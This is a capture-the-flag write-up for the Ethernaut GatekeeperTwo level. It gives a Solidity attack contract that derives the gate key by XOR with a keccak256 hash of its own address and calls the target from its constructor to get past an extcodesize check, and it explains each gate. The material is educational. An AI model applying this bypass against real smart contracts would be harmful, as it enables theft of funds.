# GatekeeperTwo
This levels requires you to get familiar with the Ethereum yellow paper and pass three more gates.
## code:
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;
interface GatekeeperTwo{
    function enter(bytes8) external returns (bool);
}

contract Attack{
    GatekeeperTwo victim ;  
    constructor(address _victim) public {
        victim = GatekeeperTwo(_victim);
        bytes8 gate_key = bytes8(uint64((uint64(0) - 1) ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ));
        bool success = victim.enter(gate_key);
        require(success,"Failed");
    }

}
```
## gate one:
Two pass gate one you should use another contract to do the attack same as telephone level.
## gate two:
Gate two requires the address not to be a contract that means the code in that address should be 0.
To pass this gate you should initiate the attack from the constructor where the code size of the contract is still 0.
## gate three:
Gate three is using xor `a ^ b = c` we have `a` and `c` so we can  get b by `c ^ a`.  
